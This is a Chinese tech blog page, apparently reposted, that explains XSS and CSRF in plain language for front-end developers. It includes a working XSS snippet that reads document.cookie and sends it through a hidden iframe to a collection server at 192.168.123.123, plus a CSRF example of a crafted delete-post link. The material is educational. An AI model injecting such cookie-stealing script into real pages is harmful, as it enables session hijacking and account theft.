<!DOCTYPE html><html lang="zh"><head><meta name="generator" content="Hugo 0.51"><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="HandheldFriendly" content="True"><meta name="viewport" content="initial-scale=1,width=device-width,minimum-scale=1,maximum-scale=1,user-scalable=no"><meta name="wap-font-scale" content="no"><meta name="360-site-verification" content="0903ba33c82867d1f7bd8831e32a7e34"><meta name="sogou_site_verification" content="E8uWFBcf4a"><meta name="author" content="Fan"><meta name="description" itemprop="description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta name="keywords" content="Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js"><meta property="og:locale" content="en_US"><meta property="og:title" content="用大白话谈谈XSS与CSRF"><meta property="og:image" content="https://alili.tech/images/logo2.png"><meta property="og:description" content="Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css"><meta property="og:site_name" content="Alili"><title>用大白话谈谈XSS与CSRF | 前端大爆炸! - WEB BANG! BANG!! BANG!!!</title><link rel="shortcut icon" href="https://alili.tech/images/favicon.ico"><link rel="manifest" href="/manifest.json"><link rel="stylesheet" href="https://alili.tech/lib/font-awesome/css/font-awesome.min.css"><link rel="stylesheet" href="https://alili.tech/lib/justified-gallery/justifiedGallery.min.css"><link rel="stylesheet" href="https://alili.tech/css/style.css"><script src="https://alili.tech/lib/highlight.min.js"></script><script>hljs.initHighlightingOnLoad();</script><script src="https://alili.tech/lib/jquery/jquery.min.js"></script><script>document.addEventListener("error", function (e) {
			  var elem = e.target;
			  if (elem.tagName.toLowerCase() == 'img') {
				elem.style.display='none'
			  }
			}, true);</script><script type="application/ld+json">{
				"@context": "https://ziyuan.baidu.com/contexts/cambrian.jsonld",
				"@id": "https://alili.tech/archive/e9jrpjhbwdk/",
				"appid": "1613049289050283", 
				"title": "用大白话谈谈XSS与CSRF | 前端大爆炸! - WEB BANG! BANG!! BANG!!!", 
				"images": [],
				"pubDate": "2019-02-02T02:30:11"
			}</script></head><body><div id="header-post"><a id="menu-icon" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="menu-icon-tablet" href="#"><i class="fa fa-bars fa-lg"></i></a> <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa fa-chevron-up fa-lg"></i></a> <span id="menu"><span id="nav"><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></span><br><span id="actions"><ul><li><a class="icon" href="https://alili.tech/archive/d8xrb6ytsp5/"><i class="fa fa-chevron-left" aria-hidden="true" onmouseover='$("#i-prev").toggle();' onmouseout='$("#i-prev").toggle();'></i></a></li><li><a class="icon" href="https://alili.tech/archive/g056edo5uur/"><i class="fa fa-chevron-right" aria-hidden="true" onmouseover='$("#i-next").toggle();' onmouseout='$("#i-next").toggle();'></i></a></li><li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up" aria-hidden="true" onmouseover='$("#i-top").toggle();' onmouseout='$("#i-top").toggle();'></i></a></li><li><a class="icon" href="#"><i class="fa fa-share-alt" aria-hidden="true" onmouseover='$("#i-share").toggle();' onmouseout='$("#i-share").toggle();' onclick='$("#share").toggle();return false;'></i></a></li></ul><span id="i-prev" class="info" style="display:none;">Previous post</span> <span id="i-next" class="info" style="display:none;">Next post</span> <span id="i-top" class="info" style="display:none;">Back to top</span> <span id="i-share" class="info" style="display:none;">Share post</span></span><br><div id="share" style="display: none"><ul><li><a class="icon" href="http://v.t.sina.com.cn/share/share.php?u=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&text=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-weibo" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.facebook.com/sharer.php?u=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f"><i class="fa fa-facebook" aria-hidden="true"></i></a></li><li><a class="icon" href="https://twitter.com/share?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&text=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-twitter" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&title=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li><li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&is_video=false&description=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-pinterest" aria-hidden="true"></i></a></li><li><a class="icon" href="mailto:?subject=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF&body=Check out this article: https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f"><i class="fa fa-envelope" aria-hidden="true"></i></a></li><li><a class="icon" href="https://getpocket.com/save?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&title=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-get-pocket" aria-hidden="true"></i></a></li><li><a class="icon" href="http://reddit.com/submit?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&title=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-reddit" aria-hidden="true"></i></a></li><li><a class="icon" href="http://www.stumbleupon.com/submit?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&title=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-stumbleupon" aria-hidden="true"></i></a></li><li><a class="icon" href="http://digg.com/submit?url=https%3a%2f%2falili.tech%2farchive%2fe9jrpjhbwdk%2f&title=%e7%94%a8%e5%a4%a7%e7%99%bd%e8%af%9d%e8%b0%88%e8%b0%88XSS%e4%b8%8eCSRF"><i class="fa fa-digg" aria-hidden="true"></i></a></li></ul></div><div id="toc"><nav id="TableOfContents"><ul><li><a href="#版权声明">版权声明</a><ul><li><a href="#原文标题">原文标题</a></li><li><a href="#原文链接">原文链接</a></li></ul></li></ul></nav></div></span></div><div class="content index width mx-auto px3 my3"><section id="wrapper" class="home"><article class="post" itemscope itemtype="http://schema.org/BlogPosting"><header><h1 class="posttitle" itemprop="name headline">用大白话谈谈XSS与CSRF</h1><div class="meta"><div class="postdate"><time datetime="2019-02-02" itemprop="datePublished">2019-02-02</time></div><div class="article-tag"><i class="fa fa-eye"></i> <span id="busuanzi_container_page_pv"><span id="busuanzi_value_page_pv">0</span></span></div><div class="article-tag-box"></div></div></header><div class="content" itemprop="articleBody"><div id="raw"><p style="opacity: 0;">Alili | 前端大爆炸! - WEB BANG! BANG!! BANG!!! 前端大爆炸,一个前端技术博客.想到哪,学到哪,写到哪. 本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有， Alili, 前端大爆炸, WEB BANG BANG BANG, web前端博客, 前端模块化, 前端工程化, 前端数据监控, 性能优化, 网页制作, 前端, js, html5, css, 踩坑小报告, 微前端, 树莓派, 前端开发, 区块链, 网络, Mongodb, Vue.js, Angular.js, node.js</p><script>$(function () {
            var html = "\n\n                    \n\x3cp\x3e这两个关键词也是老生常谈了，但是还总是容易让人忘记与搞混~。\x3cbr\x3eXSS与CSRF这两个关键词时常被拉出来一起比较（\x3cstrong\x3e尤其是面试\x3c\/strong\x3e），我在这里也在写一篇扫盲文，也帮自己整理一下知识脉络。\x3c\/p\x3e\n\x3cp\x3e这篇文章会用尽量“人话”的语言解释这二个关键词，让同学们对跨域，安全有更深一层次的了解。\x3c\/p\x3e\n\x3cp\x3e国际惯例，先上一下维基百科：\x3c\/p\x3e\n\x3cp\x3eXSS：跨站脚本（Cross-site scripting，通常简称为XSS）是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。\x3cstrong\x3e这类攻击通常包含了HTML以及用户端脚本语言\x3c\/strong\x3e。\x3cbr\x3eI\x3cbr\x3eCSRF:跨站请求伪造（英语：Cross-site request forgery），也被称为 one-click attack 或者 session riding，通常缩写为 CSRF 或者 XSRF， 是一种挟制用户在当前已登录的Web应用程序上\x3cstrong\x3e执行非本意的操作的攻击方法\x3c\/strong\x3e。\x3c\/p\x3e\n\x3chr\x3e\n\x3cp\x3e维基的解释依旧高深莫测啊，我用 “人话”给大家解释一下吧。\x3c\/p\x3e\n\x3cp\x3eXSS： 通过客户端脚本语言（最常见如：JavaScript）\x3cbr\x3e在一个论坛发帖中发布一段恶意的JavaScript代码就是脚本注入，如果这个代码内容有请求外部服务器，那么就叫做XSS！\x3c\/p\x3e\n\x3cp\x3eCSRF：又称XSRF，冒充用户发起请求（在用户不知情的情况下）,完成一些违背用户意愿的请求（如恶意发帖，删帖，改密码，发邮件等）。\x3c\/p\x3e\n\x3cblockquote\x3e\x3cp\x3e很多同学会搞不明白XSS与CSRF的区别，虽然这两个关键词时常抱团出现，但他们两个是不同维度的东西（或者说他们的目的是不一样的）。\x3cbr\x3e XSS更偏向于方法论，CSRF更偏向于一种形式，只要是伪造用户发起的请求，都可成为CSRF攻击。\x3c\/p\x3e\x3c\/blockquote\x3e\n\x3cp\x3e通常来说CSRF是由XSS实现的，所以CSRF时常也被称为XSRF[用XSS的方式实现伪造请求]（但实现的方式绝不止一种，还可以直接通过命令行模式（命令行敲命令来发起请求）直接伪造请求[只要通过合法验证即可]）。\x3cbr\x3e XSS更偏向于代码实现（即写一段拥有跨站请求功能的JavaScript脚本注入到一条帖子里，然后有用户访问了这个帖子，这就算是中了XSS攻击了），CSRF更偏向于一个攻击结果，只要发起了冒牌请求那么就算是CSRF了。\x3c\/p\x3e\n\x3cp\x3e简单来说，条条大路（XSS路，命令行路）通罗马（CSRF马，XSRF马）。\x3c\/p\x3e\n\x3cp\x3e前面讲了那么多理论介绍，那么我们来看一看实际代码吧。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e 【 Talk is cheap，Show me the code 】 \x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e场景：我在一条帖子里面写下了如下代码，发了出去，然后陆陆续续有很多可爱（wu \/ zhi） 的用户访问到这个帖子，然后用户接下来的所有操作都由我这串代码掌控了（各种姿势混着玩~）\x3c\/p\x3e\n\x3cp\x3e如下：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22while(true){\n    alert(\x27你关不掉我\x27);\n}\n\n\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs xquery\x22\x3e\x3ccode\x3e\x3cspan class=\x22hljs-keyword\x22\x3ewhile\x3c\/span\x3e(\x3cspan class=\x22hljs-literal\x22\x3etrue\x3c\/span\x3e){\n    alert(\x3cspan class=\x22hljs-string\x22\x3e\x27你关不掉我\x27\x3c\/span\x3e);\n}\n\n\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e这个就是最原始的脚本注入了。\x3cbr\x3e用户进来就麻烦了，一直弹窗一直弹窗。\x3c\/p\x3e\n\x3cp\x3e那么XSS（跨站脚本）就是照瓢画葫了，用JavaScript写一个请求跨站的脚本就是XSS了，如下：\x3c\/p\x3e\n\x3cdiv class=\x22widget-codetool\x22 style=\x22display:none;\x22\x3e\n      \x3cdiv class=\x22widget-codetool--inner\x22\x3e\n      \x3cspan class=\x22selectCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22全选\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22copyCode code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 data-clipboard-text=\x22\n\/\/ 用 \x3cscript type=\x26quot;text\/javascript\x26quot;\x3e\x3c\/script\x3e 包起来放在评论中\n(function(window, document) {\n    \/\/ 构造泄露信息用的 URL\n    var cookies = document.cookie;\n    var xssURIBase = \x26quot;http:\/\/192.168.123.123\/myxss\/\x26quot;;\n    var xssURI = xssURIBase \x2b window.encodeURI(cookies);\n    \/\/ 建立隐藏 iframe 用于通讯\n    var hideFrame = document.createElement(\x26quot;iframe\x26quot;);\n    hideFrame.height = 0;\n    hideFrame.width = 0;\n    hideFrame.style.display = \x26quot;none\x26quot;;\n    hideFrame.src = xssURI;\n    \/\/ 开工\n    document.body.appendChild(hideFrame);\n})(window, document);\n\x22 title=\x22\x22 data-original-title=\x22复制\x22\x3e\x3c\/span\x3e\n      \x3cspan type=\x22button\x22 class=\x22saveToNote code-tool\x22 data-toggle=\x22tooltip\x22 data-placement=\x22top\x22 title=\x22\x22 data-original-title=\x22放进笔记\x22\x3e\x3c\/span\x3e\n      \x3c\/div\x3e\n      \x3c\/div\x3e\x3cpre class=\x22hljs typescript\x22\x3e\x3ccode\x3e\n\x3cspan class=\x22hljs-comment\x22\x3e\/\/ 用 \x26lt;script type=\x22text\/javascript\x22\x26gt;\x26lt;\/script\x26gt; 包起来放在评论中\x3c\/span\x3e\n(\x3cspan class=\x22hljs-function\x22\x3e\x3cspan class=\x22hljs-keyword\x22\x3efunction\x3c\/span\x3e(\x3cspan class=\x22hljs-params\x22\x3e\x3cspan class=\x22hljs-built_in\x22\x3ewindow\x3c\/span\x3e, \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e\x3c\/span\x3e) \x3c\/span\x3e{\n    \x3cspan class=\x22hljs-comment\x22\x3e\/\/ 构造泄露信息用的 URL\x3c\/span\x3e\n    \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e cookies = \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.cookie;\n    \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e xssURIBase = \x3cspan class=\x22hljs-string\x22\x3e\x22http:\/\/192.168.123.123\/myxss\/\x22\x3c\/span\x3e;\n    \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e xssURI = xssURIBase \x2b \x3cspan class=\x22hljs-built_in\x22\x3ewindow\x3c\/span\x3e.encodeURI(cookies);\n    \x3cspan class=\x22hljs-comment\x22\x3e\/\/ 建立隐藏 iframe 用于通讯\x3c\/span\x3e\n    \x3cspan class=\x22hljs-keyword\x22\x3evar\x3c\/span\x3e hideFrame = \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.createElement(\x3cspan class=\x22hljs-string\x22\x3e\x22iframe\x22\x3c\/span\x3e);\n    hideFrame.height = \x3cspan class=\x22hljs-number\x22\x3e0\x3c\/span\x3e;\n    hideFrame.width = \x3cspan class=\x22hljs-number\x22\x3e0\x3c\/span\x3e;\n    hideFrame.style.display = \x3cspan class=\x22hljs-string\x22\x3e\x22none\x22\x3c\/span\x3e;\n    hideFrame.src = xssURI;\n    \x3cspan class=\x22hljs-comment\x22\x3e\/\/ 开工\x3c\/span\x3e\n    \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e.body.appendChild(hideFrame);\n})(\x3cspan class=\x22hljs-built_in\x22\x3ewindow\x3c\/span\x3e, \x3cspan class=\x22hljs-built_in\x22\x3edocument\x3c\/span\x3e);\n\x3c\/code\x3e\x3c\/pre\x3e\n\x3cp\x3e此段代码携带着cookie信息传输给了  \x3cstrong\x3e \x3ca href=\x22http:\/\/192.168.123.123\/myxss\/\/strong\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttp:\/\/192.168.123.123\/myxss\/...\x3c\/a\x3e  这段服务器，然后服务器的代码就可以接收到了用户的隐私消息，继而继续做其他的业务处理（myxss\/index.php 中写一些可怕的代码，如把用户信息存进自己的数据库）。\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e\x3cem\x3e有没感觉到背后一寒\x3c\/em\x3e\x3c\/p\x3e\n\x3cp\x3e看到这里感觉到危险了吧（想想初学程序时我们的站点完全没有这个意识，活生生的是在裸奔），=\x3cbr\x3e既然此段脚本注入能携带着用户信息到收集服务器，那么再研究研究，他自然能发邮件？发帖？一系列业务逻辑？  ~~当然可以！。\x3c\/p\x3e\n\x3cp\x3e这里tips一下：上面的代码仅仅是XSS，并没有发生CSRF，因为192.168.123.123\/myxss\/index.php 仅仅是把用户信息存起来了而已，他并没有“伪造”用户发起一些请求，所以他只算是XSS攻击而不算是CSRF攻击，如果192.168.123.123\/myxss\/index.php 写的代码是 将当前用户的昵称改为“我是大笨猪”，那么就算是CSRF攻击了，因为这段代码伪造用户发出了请求（但是用户却不自知）。\x3c\/p\x3e\n\x3cp\x3e那么下面我介绍一下最最简单的CSRF攻击（没有用到XSS的哦）：\x3cbr\x3e一个论坛，经过我的多次抓包分析（着重分析请求返回头，请求返回体）了解到这个论坛的删帖操作是触发 csdnblog.com\/bbs\/delete_article.php?id=“X\x22 那么，我只需要在论坛中发一帖，包含一链接：www.csdnblog.com\/bbs\/delete_article.php?id=“X\x22 ，只要有用户点击了这个链接，那么ID为X的这一篇文章就被删掉了，而且是用户完全不知情的情况（敲黑板状：此处我可没有写XSS脚本哦，我纯粹是发一个url地址出来而已，既然删除操作可以伪造，那么只要我细细分析，其他操作（发帖，改名字，发私信，只要是这个论坛具有的功能）我都可以伪造咯！\x3c\/p\x3e\n\x3cp\x3eXSS与CSRF讲完了，回头我会讲下如何防范XSS与CSRF。\x3c\/p\x3e\n\x3cp\x3e\x3cstrong\x3e今天国庆日，6天后国足将在西安迎战叙利亚，此战胜负十分关键！祝好运！国足队员加油！\x3c\/strong\x3e\x3c\/p\x3e\n\x3cp\x3e参考文章：\x3cbr\x3e\x3ca href=\x22https:\/\/segmentfault.com\/a\/1190000004623125\x22\x3ehttps:\/\/segmentfault.com\/a\/11...\x3c\/a\x3e 《 总结 XSS 与 CSRF 两种跨站攻击 》\x3cbr\x3e\x3ca href=\x22http:\/\/www.lxway.com\/482281211.htm\x22 rel=\x22nofollow noreferrer\x22 target=\x22_blank\x22\x3ehttp:\/\/www.lxway.com\/48228121...\x3c\/a\x3e 《CSRF CORS》\x3c\/p\x3e\n\x3cp\x3e学习\/（“抄”） 了不少文章（主要是demo代码不想重复写了），侵删。\x3c\/p\x3e\n\n                \n"
            html = html.replace(/"{/g, "{")
            html = html.replace(/{"/g, "{")
            html = html.replace(/"}/g, "}")
            html = html.replace(/}"/g, "}")
            $('#raw').html(html);

            let postTitle =  $('.posttitle').text()
            let postContentTitle =  $('#raw > h1').text()
            if(postTitle === postContentTitle){
                $('#raw > h1').hide()
            }
            $('button.preview').hide()
        })</script></div><h1 id="版权声明">版权声明</h1><p>本文资源来源互联网，仅供学习研究使用，版权归该资源的合法拥有者所有，</p><p>本文仅用于学习、研究和交流目的。转载请注明出处、完整链接以及原作者。</p><p>原作者若认为本站侵犯了您的版权，请联系我们，我们会立即删除！</p><h2 id="原文标题">原文标题</h2><p>用大白话谈谈XSS与CSRF</p><h2 id="原文链接">原文链接</h2><p><a href="https://segmentfault.com/a/1190000007059639">https://segmentfault.com/a/1190000007059639</a></p><h2>本文链接：</h2><a href="https://alili.tech/archive/e9jrpjhbwdk/" target="_blank">https://alili.tech/archive/e9jrpjhbwdk/</a></div></article><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//unpkg.com/valine/dist/Valine.min.js"></script><div class="blog-post-comments"></div><script>new Valine({
        el: '.blog-post-comments', 
        app_id: 'ItyOVb4I33bTwprf3cY6uqMc-gzGzoHsz', 
        app_key: 'hLhtmd4tT0qJbyO2SgQ8odya', 
        placeholder: '说点什么?', 
        avatar:'robohash',
        notify:true,
        verify:true
    });</script><ul id="more-post-list" class="archive readmore"><h3>其他推荐</h3><li><a href="/archive/5ed53lrrg7e/">如何禁止浏览器自动填充<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/gij1sdp355j/">实践是检验程序员的唯一标准02：用户不想跟你说话并向你扔出一张图片 - 图片上传组件开发【开发篇】<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/y9eqaypgij/">123<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/4ho25kya1mg/">2018你成长了么？一份给你的前端技术清单<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/g2lx7wrrhy4/">Apache、Nginx 与 Node.js 之争 —— WordPress 与 Ghost 的性能大对决<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/dfejr0q89no/">CSS单位em是相对于父元素还是当前元素的字体大小？<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/cik25m3bh7m/">ES6 系列之 Babel 将 Generator 编译成了什么样子<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/vwkme203i7/">ES6 系列之异步处理实战<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/q2at4ffqrr/">Hola～ 一款基于Electron的聊天软件<aside class="dates">2019-02-15</aside></a></li><li><a href="/archive/t2mci6htsdn/">JavaScript 数组操作方法小结<aside class="dates">2019-02-15</aside></a></li></ul></section></div><footer id="footer"><div class="footer-left">Copyright © 2019 Fan <a href="http://www.miitbeian.gov.cn" rel="external nofollow noopener noreferrer" target="_blank">浙ICP备18045521号</a></div><div class="footer-right"><nav><ul><li><a href="/">Home</a></li><li><a href="/archive/">Archives</a></li><li><a href="/about/">About</a></li><li><a href="http://github.com/Fantasy9527" target="_blank">Github</a></li></ul></nav></div></footer><script src="https://alili.tech/lib/justified-gallery/jquery.justifiedGallery.min.js"></script><script src="https://alili.tech/lib/typed.js"></script><script src="https://alili.tech/js/main.js"></script><script async src=""></script><script>(function(){
  if(location.host!=='alili.tech')return;
  var ga = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  ga.src = 'https://www.googletagmanager.com/gtag/js?id=UA-129382678-1';       
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(ga, s);
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-129382678-1');
})()</script><script>(function(){
    if(location.host!=='alili.tech')return;
      var bp = document.createElement('script');
      var curProtocol = window.location.protocol.split(':')[0];
      if (curProtocol === 'https') {
          bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
      }
      else {
          bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
      var s = document.getElementsByTagName("script")[0];
      s.parentNode.insertBefore(bp, s);
  })();</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script>if ('serviceWorker' in navigator) {
      window.addEventListener('load', () => {
          navigator.serviceWorker
              .register('/sw.js')
              .then(registration => {
                  console.log('SW registered: ', registration);
              })
              .catch(registrationError => {
                  console.log('SW registration failed: ', registrationError);
              });
      });
  }</script></body></html>